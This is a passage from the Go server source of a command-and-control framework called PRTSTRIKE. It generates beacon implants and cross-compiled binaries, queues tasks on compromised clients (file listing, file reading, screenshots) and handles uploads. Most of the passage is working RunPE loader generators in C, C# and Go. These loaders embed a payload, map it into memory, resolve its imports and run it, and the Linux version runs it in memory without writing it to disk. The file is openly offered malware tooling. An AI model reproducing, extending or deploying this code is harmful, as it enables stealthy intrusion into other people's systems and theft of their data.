		// build-time ID would merge every instance of one script into one beacon.
		cfg.BeaconID = ""
		if err := generateFromTemplate("implants/beacon.sh", dstFile, cfg); err != nil {
			addLog("ERR", "BASH_GEN_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "executable":
		if err := buildGoImplant(dstFile, req.OS, req.Arch, cfg); err != nil {
			addLog("ERR", "BUILD_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "shellcode_bin", "shellcode_raw":
		// Build Go implant to temp PE/ELF, then export raw bytes
		tmpExtSC := ""
		if req.OS == "windows" {
			tmpExtSC = ".exe"
		}
		tmpFileSC := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtSC))

		if err := buildGoImplant(tmpFileSC, req.OS, req.Arch, cfg); err != nil {
			addLog("ERR", "SHELLCODE_BUILD_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		defer os.Remove(tmpFileSC)

		rawBytes, err := os.ReadFile(tmpFileSC)
		if err != nil {
			addLog("ERR", "SHELLCODE_READ_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SHELLCODE_READ_FAILED"})
			return
		}
		if err := os.WriteFile(dstFile, rawBytes, 0644); err != nil {
			addLog("ERR", "SHELLCODE_WRITE_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SHELLCODE_WRITE_FAILED"})
			return
		}
		addLog("GEN", fmt.Sprintf("RAW_PE_EXPORTED: arch=%s size=%d", req.Arch, len(rawBytes)))

	case "shellcode_c", "shellcode_csharp", "shellcode_go":
		// Build Go implant, embed PE bytes + RunPE loader into source code
		tmpExtEmbed := ""
		if req.OS == "windows" {
			tmpExtEmbed = ".exe"
		}
		tmpFileEmbed := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtEmbed))

		if err := buildGoImplant(tmpFileEmbed, req.OS, req.Arch, cfg); err != nil {
			addLog("ERR", "SHELLCODE_EMBED_BUILD_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		defer os.Remove(tmpFileEmbed)

		peBytes, errPE := os.ReadFile(tmpFileEmbed)
		if errPE != nil {
			addLog("ERR", "PE_READ_FAILED: "+errPE.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PE_READ_FAILED"})
			return
		}

		var sourceCode string
		switch req.Type {
		case "shellcode_c":
			sourceCode = generateCLoader(peBytes, req.OS)
		case "shellcode_csharp":
			sourceCode = generateCSharpLoader(peBytes)
		case "shellcode_go":
			sourceCode = generateGoLoader(peBytes)
		}

		if errW := os.WriteFile(dstFile, []byte(sourceCode), 0644); errW != nil {
			addLog("ERR", "SHELLCODE_EMBED_WRITE_FAILED: "+errW.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "WRITE_FAILED"})
			return
		}

		addLog("GEN", fmt.Sprintf("PE_EMBED_GENERATED: type=%s arch=%s peSize=%d", req.Type, req.Arch, len(peBytes)))

	default:
		stubContent := fmt.Sprintf("PRTSTRIKE_PAYLOAD_STUB_%s\nLISTENER:%s\nTYPE:%s", newID, req.ListenerID, req.Type)
		os.WriteFile(dstFile, []byte(stubContent), 0644)
	}

	// Get file size
	var fileSize int64
	if fi, err := os.Stat(dstFile); err == nil {
		fileSize = fi.Size()
	}

	p := &Payload{
		ID:          newID,
		Name:        req.Name,
		Type:        req.Type,
		OS:          req.OS,
		Arch:        req.Arch,
		FileSize:    fileSize,
		ListenerID:  req.ListenerID,
		CreatedAt:   time.Now(),
		DownloadURL: "/static/payloads/" + newID + "." + ext,
		BeaconKey:   beaconKey,
	}

	if err := db.Create(p).Error; err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("GEN", fmt.Sprintf("ARTIFACT_GENERATED: %s [%s/%s/%s] %d bytes", req.Name, req.Type, req.OS, req.Arch, fileSize))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "ARTIFACT_GENERATED", Data: p})
}

// ── Template value escaping ──────────────────────────────
//
// Operator-supplied values are interpolated into quoted strings inside the
// generated scripts. Without escaping, a value like `$(calc.exe)` would
// execute on the target when the script is loaded.

func escapePS1DoubleQuoted(s string) string {
	r := strings.NewReplacer(
		"`", "``",
		"\"", "\\\"",
		"$", "`$",
	)
	return r.Replace(s)
}

func escapeShDoubleQuoted(s string) string {
	r := strings.NewReplacer(
		"\\", "\\\\",
		"\"", "\\\"",
		"$", "\\$",
		"`", "\\`",
	)
	return r.Replace(s)
}

func escapePyDoubleQuoted(s string) string {
	r := strings.NewReplacer(
		"\\", "\\\\",
		"\"", "\\\"",
	)
	return r.Replace(s)
}

// generateFromTemplate reads a template file and substitutes the implant
// configuration, escaping values according to the template language.
func generateFromTemplate(tmplPath, dstFile string, cfg implantConfig) error {
	content, err := os.ReadFile(tmplPath)
	if err != nil {
		return fmt.Errorf("TEMPLATE_NOT_FOUND: %s", tmplPath)
	}
	script := string(content)

	var esc func(string) string
	switch {
	case strings.HasSuffix(tmplPath, ".ps1"):
		esc = escapePS1DoubleQuoted
	case strings.HasSuffix(tmplPath, ".sh"):
		esc = escapeShDoubleQuoted
	default:
		esc = escapePyDoubleQuoted
	}

	script = strings.ReplaceAll(script, "{{C2_URL}}", esc(cfg.C2URL))
	script = strings.ReplaceAll(script, "{{BEACON_ID}}", esc(cfg.BeaconID))
	script = strings.ReplaceAll(script, "{{BEACON_KEY}}", esc(cfg.BeaconKey))
	script = strings.ReplaceAll(script, "{{SLEEP}}", strconv.Itoa(cfg.Sleep))
	script = strings.ReplaceAll(script, "{{JITTER}}", strconv.Itoa(cfg.Jitter))
	script = strings.ReplaceAll(script, "{{PROTO}}", esc(cfg.Proto))
	script = strings.ReplaceAll(script, "{{ALLOWED_IPS}}", esc(cfg.AllowedIPs))
	script = strings.ReplaceAll(script, "{{BLOCKED_IPS}}", esc(cfg.BlockedIPs))
	return os.WriteFile(dstFile, []byte(script), 0644)
}

// buildGoImplant compiles the Go implant for the specified OS/Arch.
// The entire runtime configuration is serialized to JSON, base64-encoded and
// injected with a single `-X main.cfgB64=...` linker variable. Base64's
// alphabet contains no whitespace or quotes, so user-controlled values can
// never inject additional linker flags (the old per-value -X interpolation
// allowed exactly that, e.g. via -extld, achieving code execution on the C2).
func buildGoImplant(dstFile, targetOS, targetArch string, cfg implantConfig) error {
	srcDir := "implants"
	if _, err := os.Stat(filepath.Join(srcDir, "main.go")); os.IsNotExist(err) {
		return fmt.Errorf("SOURCE_NOT_FOUND")
	}

	absDst, err := filepath.Abs(dstFile)
	if err != nil {
		return fmt.Errorf("DST_PATH_FAILED: %v", err)
	}

	cfgJSON, err := json.Marshal(cfg)
	if err != nil {
		return fmt.Errorf("CONFIG_MARSHAL_FAILED: %v", err)
	}

	// Static ldflags only (symbols stripped, no console window on Windows)
	// plus the injection-safe base64 config blob.
	ldflagsBase := "-s -w -buildid="
	if targetOS == "windows" || (targetOS == "" && runtime.GOOS == "windows") {
		ldflagsBase = "-s -w -buildid= -H windowsgui"
	}
	ldflags := ldflagsBase + " -X main.cfgB64=" + base64.StdEncoding.EncodeToString(cfgJSON)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "go", "build",
		"-trimpath",
		"-buildvcs=false",
		"-ldflags", ldflags,
		"-o", absDst, ".")
	cmd.Dir = srcDir
	cmd.Env = os.Environ()
	// Disable CGO for smaller static binary and cross-compilation
	cmd.Env = append(cmd.Env, "CGO_ENABLED=0")
	if targetOS != "" {
		cmd.Env = append(cmd.Env, "GOOS="+targetOS)
	}
	if targetArch != "" {
		cmd.Env = append(cmd.Env, "GOARCH="+targetArch)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("BUILD_TIMEOUT")
		}
		return fmt.Errorf("BUILD_FAILED: %s", string(output))
	}

	return nil
}

// ══════════════════════════════════════════════════════════
//  Task Handlers
// ══════════════════════════════════════════════════════════

type taskListRow struct {
	ID           string    `json:"id"`
	ClientID     string    `json:"client_id"`
	Command      string    `json:"command"`
	Status       string    `json:"status"`
	ResultPrefix string    `gorm:"column:result_prefix"`
	ResultSize   int64     `gorm:"column:result_size"`
	CreatedAt    time.Time `json:"created_at"`
}

type taskListItem struct {
	ID           string    `json:"id"`
	ClientID     string    `json:"client_id"`
	Command      string    `json:"command"`
	Status       string    `json:"status"`
	Result       string    `json:"result"`
	ResultSize   int64     `json:"result_size"`
	HasResult    bool      `json:"has_result"`
	IsScreenshot bool      `json:"is_screenshot"`
	CreatedAt    time.Time `json:"created_at"`
}

func buildTaskResultPreview(command, resultPrefix string, resultSize int64) (string, bool, bool) {
	if resultSize <= 0 {
		return "", false, false
	}

	if strings.HasPrefix(resultPrefix, "SCREENSHOT:") {
		return "[SCREENSHOT - Click to view]", true, true
	}

	if strings.HasPrefix(command, "__FILEREAD__ ") && strings.Contains(resultPrefix, "\"base64\"") {
		return "[FILE DOWNLOAD DATA - Click to view]", false, true
	}

	preview := strings.ReplaceAll(resultPrefix, "\x00", "")
	preview = strings.ReplaceAll(preview, "\r", "")
	preview = strings.TrimSpace(preview)
	if preview == "" {
		preview = "(empty output)"
	}
	if resultSize > int64(len(resultPrefix)) {
		preview += "..."
	}
	return preview, false, true
}

func handleGetTask(c *gin.Context) {
	taskID := c.Param("id")
	if taskID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "TASK_ID_REQUIRED"})
		return
	}

	var task Task
	result := db.Limit(1).Find(&task, "id = ?", taskID)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_LOAD_TASK"})
		return
	}
	if result.RowsAffected == 0 {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "TASK_NOT_FOUND"})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: task})
}

func handleGetTasks(c *gin.Context) {
	clientID := c.Query("client_id")
	status := c.Query("status")
	var taskList []taskListRow

	query := db.Model(&Task{}).
		Select("id, client_id, command, status, created_at, coalesce(substr(result, 1, 160), '') as result_prefix, coalesce(length(result), 0) as result_size").
		Order("created_at desc")
	if clientID != "" {
		query = query.Where("client_id = ?", clientID)
	}
	if status != "" {
		query = query.Where("status = ?", status)
	}
	if err := query.Limit(200).Find(&taskList).Error; err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_LOAD_TASKS"})
		return
	}

	items := make([]taskListItem, 0, len(taskList))
	for _, task := range taskList {
		preview, isScreenshot, hasResult := buildTaskResultPreview(task.Command, task.ResultPrefix, task.ResultSize)
		items = append(items, taskListItem{
			ID:           task.ID,
			ClientID:     task.ClientID,
			Command:      task.Command,
			Status:       task.Status,
			Result:       preview,
			ResultSize:   task.ResultSize,
			HasResult:    hasResult,
			IsScreenshot: isScreenshot,
			CreatedAt:    task.CreatedAt,
		})
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: items})
}

func handleCreateTask(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Command  string `json:"command" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	msg, data, err := processCommand(req.ClientID, req.Command)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: msg, Data: data})
}

// ══════════════════════════════════════════════════════════
//  File Handlers
// ══════════════════════════════════════════════════════════

func handleGetFiles(c *gin.Context) {
	clientID := c.Query("client_id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CLIENT_ID_REQUIRED"})
		return
	}

	path := c.Query("path")
	if path == "" {
		path = "."
	}
	cmd := "__FILELIST__ " + path

	// Check for a recent cached result
	var task Task
	err := db.Where("client_id = ? AND command = ? AND status = ? AND created_at > ?",
		clientID, cmd, "completed", time.Now().Add(-10*time.Minute)).
		Order("created_at desc").First(&task).Error

	if err == nil && task.Result != "" {
		var result map[string]interface{}
		if jsonErr := json.Unmarshal([]byte(task.Result), &result); jsonErr == nil {
			c.JSON(http.StatusOK, APIResponse{Status: "success", Data: result})
			return
		}
	}

	// Queue file list task using the cross-platform __FILELIST__ command.
	newTask, err := createPendingTask(clientID, cmd)
	if err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	c.JSON(http.StatusOK, APIResponse{
		Status:  "success",
		Message: "FILE_LIST_QUEUED",
		Data:    map[string]string{"task_id": newTask.ID},
	})
}

func handleFileUpload(c *gin.Context) {
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxManagedUploadSize+1<<20)
	clientID := c.PostForm("client_id")
	file, err := c.FormFile("file")

	if clientID == "" || err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "MISSING_PARAMS"})
		return
	}
	if file.Size < 0 || file.Size > maxManagedUploadSize {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UPLOAD_TOO_LARGE"})
		return
	}

	// Save file to uploads directory
	uploadDir := "./uploads"
	if _, err := os.Stat(uploadDir); os.IsNotExist(err) {
		if err := os.MkdirAll(uploadDir, 0755); err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "UPLOAD_DIR_FAILED"})
			return
		}
	} else if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "UPLOAD_DIR_FAILED"})
		return
	}

	// Multipart filenames are client-controlled and may contain path
	// separators. Keep uploads inside the dedicated directory.
	filename := filepath.Base(filepath.Clean(file.Filename))
	if filename == "." || filename == string(filepath.Separator) || filename == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_FILENAME"})
		return
	}
	dst := filepath.Join(uploadDir, filename)
	uploadRoot, err := filepath.Abs(uploadDir)
	if err != nil || !pathWithinRoot(dst, uploadRoot) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_UPLOAD_PATH"})
		return
	}
	if err := c.SaveUploadedFile(file, dst); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SAVE_FAILED: " + err.Error()})
		return
	}

	addLog("FILE", fmt.Sprintf("FILE_UPLOADED: %s (%d bytes) for %s", filename, file.Size, clientID))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILE_UPLOADED", Data: map[string]string{
		"filename": filename,
		"path":     dst,
	}})
}

// ══════════════════════════════════════════════════════════
//  Shellcode Embed Generators
// ══════════════════════════════════════════════════════════

// formatBytesC formats shellcode bytes as C-style hex array initializer
func formatBytesC(data []byte) string {
	var sb strings.Builder
	for i, b := range data {
		if i > 0 {
			sb.WriteString(", ")
			if i%12 == 0 {
				sb.WriteString("\n    ")
			}
		}
		fmt.Fprintf(&sb, "0x%02x", b)
	}
	return sb.String()
}

// generateCLoader generates a C source file with embedded PE and RunPE loader
func generateCLoader(peBytes []byte, targetOS string) string {
	formatted := formatBytesC(peBytes)

	if targetOS == "linux" {
		return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (Linux)
 * Embedded ELF size: %d bytes
 *
 * Compile:
 *   gcc -o loader loader.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

unsigned char pe_data[] = {
    %s
};
unsigned int pe_size = sizeof(pe_data);

int main(int argc, char *argv[], char *envp[]) {
    // memfd_create: anonymous in-memory file, no disk touch
    int fd = (int)syscall(__NR_memfd_create, "", MFD_CLOEXEC);
    if (fd < 0) {
        // Fallback: temp file
        char tmp[] = "/tmp/.pXXXXXX";
        fd = mkstemp(tmp);
        write(fd, pe_data, pe_size);
        close(fd);
        chmod(tmp, 0755);
        char *args[] = { tmp, NULL };
        execve(tmp, args, envp);
        unlink(tmp);
        return -1;
    }

    write(fd, pe_data, pe_size);
    char *args[] = { "worker", NULL };
    fexecve(fd, args, envp);
    return -1;
}
`, len(peBytes), formatted)
	}

	// Windows RunPE loader
	return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (Windows)
 * Embedded PE size: %d bytes
 *
 * Compile (MinGW x64):
 *   x86_64-w64-mingw32-gcc -o loader.exe loader.c -mwindows -lkernel32
 * Compile (MSVC x64):
 *   cl.exe /nologo /O2 loader.c /link /SUBSYSTEM:WINDOWS kernel32.lib
 *
 * NOTE: Compile with the same architecture as the embedded PE.
 */

#include <windows.h>
#include <string.h>

unsigned char pe_data[] = {
    %s
};
unsigned int pe_size = sizeof(pe_data);

int main() {
    /* Parse PE headers */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pe_data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return -1;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(pe_data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return -1;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;

    /* Allocate memory for PE image */
    BYTE *base = (BYTE *)VirtualAlloc(
        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) {
        base = (BYTE *)VirtualAlloc(NULL, imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!base) return -1;

    /* Copy PE headers */
    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);

    /* Re-parse NT headers from mapped image */
    IMAGE_NT_HEADERS *mNT = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(mNT);
    for (WORD i = 0; i < mNT->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0 && sec[i].PointerToRawData > 0) {
            memcpy(base + sec[i].VirtualAddress,
                   pe_data + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }
    }

    /* Process base relocations */
    ULONG_PTR delta = (ULONG_PTR)base - (ULONG_PTR)mNT->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY *relocDir =
            &mNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0 && relocDir->VirtualAddress > 0) {
            IMAGE_BASE_RELOCATION *reloc =
                (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
            while (reloc->VirtualAddress > 0 && reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD cnt = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < cnt; j++) {
                    WORD type = entries[j] >> 12;
                    WORD off  = entries[j] & 0x0FFF;
                    BYTE *patch = base + reloc->VirtualAddress + off;
#ifdef _WIN64
                    if (type == IMAGE_REL_BASED_DIR64)
                        *(ULONGLONG *)patch += (ULONGLONG)delta;
#endif
                    if (type == IMAGE_REL_BASED_HIGHLOW)
                        *(DWORD *)patch += (DWORD)delta;
                }
                reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
            }
        }
    }
    mNT->OptionalHeader.ImageBase = (ULONG_PTR)base;

    /* Resolve imports */
    IMAGE_DATA_DIRECTORY *impDir =
        &mNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir->Size > 0 && impDir->VirtualAddress > 0) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);
        while (imp->Name) {
            HMODULE hDll = LoadLibraryA((char *)(base + imp->Name));
            if (!hDll) { imp++; continue; }

            IMAGE_THUNK_DATA *oThunk = (IMAGE_THUNK_DATA *)(base +
                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            IMAGE_THUNK_DATA *fThunk = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

            while (oThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(oThunk->u1.Ordinal)) {
                    fThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll,
                        MAKEINTRESOURCEA(IMAGE_ORDINAL(oThunk->u1.Ordinal)));
                } else {
                    IMAGE_IMPORT_BY_NAME *hint =
                        (IMAGE_IMPORT_BY_NAME *)(base + oThunk->u1.AddressOfData);
                    fThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, hint->Name);
                }
                oThunk++;
                fThunk++;
            }
            imp++;
        }
    }

    /* Set executable permission and flush cache */
    DWORD oldProtect;
    VirtualProtect(base, imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), base, imageSize);

    /* Execute entry point in new thread */
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)(base + mNT->OptionalHeader.AddressOfEntryPoint),
        NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
`, len(peBytes), formatted)
}

// generateCSharpLoader generates a C# source file with embedded PE and RunPE loader (PE32+ / x64)
func generateCSharpLoader(peBytes []byte) string {
	formatted := formatBytesC(peBytes)
	return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (C# / PE32+ x64)
 * Embedded PE size: %d bytes
 *
 * Compile:
 *   csc /platform:x64 /target:winexe /unsafe /out:loader.exe loader.cs
 */

using System;
using System.Runtime.InteropServices;

namespace PrtsLoader
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr addr, ulong size, uint type, uint protect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr addr, ulong size, uint newProt, out uint oldProt);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr attr, uint stackSz, IntPtr start, IntPtr param, uint flags, IntPtr tid);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr h, uint ms);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibraryA(string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr mod, string name);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr mod, IntPtr ordinal);

        [DllImport("kernel32.dll")]
        static extern bool FlushInstructionCache(IntPtr proc, IntPtr addr, ulong size);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static byte[] pe_data = new byte[] {
            %s
        };

        static ushort R16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
        static uint   R32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
        static ulong  R64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

        static void Main(string[] args)
        {
            int lfanew      = (int)R32(pe_data, 0x3C);
            ushort numSec   = R16(pe_data, lfanew + 0x06);
            ushort optSz    = R16(pe_data, lfanew + 0x14);
            uint entryRVA   = R32(pe_data, lfanew + 0x28);
            ulong imgBase   = R64(pe_data, lfanew + 0x30);
            uint sizeOfImg  = R32(pe_data, lfanew + 0x50);
            uint sizeOfHdr  = R32(pe_data, lfanew + 0x54);

            /* Allocate at preferred base, fallback to any address */
            IntPtr baseAddr = VirtualAlloc((IntPtr)(long)imgBase, sizeOfImg, 0x3000, 0x04);
            if (baseAddr == IntPtr.Zero)
                baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImg, 0x3000, 0x04);
            if (baseAddr == IntPtr.Zero) return;

            /* Copy headers */
            Marshal.Copy(pe_data, 0, baseAddr, (int)sizeOfHdr);

            /* Map sections */
            int secOff = lfanew + 0x18 + optSz;
            for (int i = 0; i < numSec; i++) {
                int s = secOff + i * 40;
                uint va   = R32(pe_data, s + 12);
                uint rawSz = R32(pe_data, s + 16);
                uint rawPtr = R32(pe_data, s + 20);
                if (rawSz > 0 && rawPtr > 0)
                    Marshal.Copy(pe_data, (int)rawPtr, baseAddr + (int)va, (int)rawSz);
            }

            /* Process relocations */
            long delta = (long)baseAddr - (long)imgBase;
            if (delta != 0) {
                uint relocRVA  = R32(pe_data, lfanew + 0xB0);
                uint relocSize = R32(pe_data, lfanew + 0xB4);
                if (relocSize > 0 && relocRVA > 0) {
                    int off = 0;
                    while (off < (int)relocSize) {
                        uint blkRVA  = (uint)Marshal.ReadInt32(baseAddr + (int)relocRVA + off);
                        uint blkSize = (uint)Marshal.ReadInt32(baseAddr + (int)relocRVA + off + 4);
                        if (blkSize == 0) break;
                        int cnt = (int)(blkSize - 8) / 2;
                        for (int j = 0; j < cnt; j++) {
                            ushort entry = (ushort)Marshal.ReadInt16(baseAddr + (int)relocRVA + off + 8 + j * 2);
                            int tp = entry >> 12;
                            int eo = entry & 0xFFF;
                            IntPtr patch = baseAddr + (int)blkRVA + eo;
                            if (tp == 10)      /* DIR64 */
                                Marshal.WriteInt64(patch, Marshal.ReadInt64(patch) + delta);
                            else if (tp == 3)  /* HIGHLOW */
                                Marshal.WriteInt32(patch, Marshal.ReadInt32(patch) + (int)delta);
                        }
                        off += (int)blkSize;
                    }
                }
            }

            /* Resolve imports */
            uint impRVA  = R32(pe_data, lfanew + 0x90);
            uint impSize = R32(pe_data, lfanew + 0x94);
            if (impSize > 0 && impRVA > 0) {
                int io = 0;
                while (true) {
                    IntPtr id = baseAddr + (int)impRVA + io;
                    uint origFT = (uint)Marshal.ReadInt32(id);
                    uint nameRV = (uint)Marshal.ReadInt32(id + 12);
                    uint firstT = (uint)Marshal.ReadInt32(id + 16);
                    if (nameRV == 0) break;

                    string dll = Marshal.PtrToStringAnsi(baseAddr + (int)nameRV);
                    IntPtr hDll = LoadLibraryA(dll);
                    if (hDll == IntPtr.Zero) { io += 20; continue; }

                    uint tRVA = origFT != 0 ? origFT : firstT;
                    int idx = 0;
                    while (true) {
                        long tv = Marshal.ReadInt64(baseAddr + (int)tRVA + idx * 8);
                        if (tv == 0) break;
                        IntPtr fn;
                        if ((tv & unchecked((long)0x8000000000000000)) != 0)
                            fn = GetProcAddress(hDll, (IntPtr)(tv & 0xFFFF));
                        else {
                            string fname = Marshal.PtrToStringAnsi(baseAddr + (int)tv + 2);
                            fn = GetProcAddress(hDll, fname);
                        }
                        Marshal.WriteInt64(baseAddr + (int)firstT + idx * 8, (long)fn);
                        idx++;
                    }
                    io += 20;
                }
            }

            /* Set executable + flush */
            uint oldProt;
            VirtualProtect(baseAddr, sizeOfImg, 0x40, out oldProt);
            FlushInstructionCache(GetCurrentProcess(), baseAddr, sizeOfImg);

            /* Run entry point */
            IntPtr ep = baseAddr + (int)entryRVA;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, ep, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
`, len(peBytes), formatted)
}

// generateGoLoader generates a Go source file with embedded PE and RunPE loader (PE32+ / x64)
func generateGoLoader(peBytes []byte) string {
	formatted := formatBytesC(peBytes)
	return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (Go / PE32+ x64)
 * Embedded PE size: %d bytes
 *
 * Compile:
 *   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o loader.exe loader.go
 */

package main

import (
	"encoding/binary"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT_RESERVE     = 0x3000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	pVirtualAlloc   = kernel32.NewProc("VirtualAlloc")
	pVirtualProtect = kernel32.NewProc("VirtualProtect")
	pCreateThread   = kernel32.NewProc("CreateThread")
	pWaitForSingle  = kernel32.NewProc("WaitForSingleObject")
	pLoadLibrary    = kernel32.NewProc("LoadLibraryA")
	pGetProcAddr    = kernel32.NewProc("GetProcAddress")
	pFlushICache    = kernel32.NewProc("FlushInstructionCache")
	pGetCurrentProc = kernel32.NewProc("GetCurrentProcess")
	pRtlMoveMemory  = ntdll.NewProc("RtlMoveMemory")
)

func r16(b []byte, o uint32) uint16 { return binary.LittleEndian.Uint16(b[o:]) }
func r32(b []byte, o uint32) uint32 { return binary.LittleEndian.Uint32(b[o:]) }
func r64(b []byte, o uint32) uint64 { return binary.LittleEndian.Uint64(b[o:]) }

func main() {
	pe := []byte{
		%s,
	}

	lfanew    := r32(pe, 0x3C)
	numSec    := r16(pe, lfanew+0x06)
	optSz     := r16(pe, lfanew+0x14)
	entryRVA  := r32(pe, lfanew+0x28)
	imgBase   := r64(pe, lfanew+0x30)
	sizeOfImg := r32(pe, lfanew+0x50)
	sizeOfHdr := r32(pe, lfanew+0x54)

	/* Allocate at preferred base, fallback to any */
	base, _, _ := pVirtualAlloc.Call(
